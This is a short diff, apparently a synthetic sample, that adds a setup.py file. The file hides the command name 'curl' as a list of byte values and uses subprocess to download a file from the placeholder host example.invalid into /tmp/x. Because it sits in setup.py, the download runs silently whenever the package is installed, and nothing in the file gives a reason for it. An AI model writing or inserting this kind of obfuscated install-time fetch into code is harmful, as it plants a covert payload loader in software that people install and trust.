@@ -1,0 +1,7 @@
+# path: setup.py
+# lines: 3
+# weight: 35
+# ---
+import subprocess
+t = bytes([99, 117, 114, 108]).decode()
+subprocess.run([t, "-o", "/tmp/x", "example.invalid/x"])
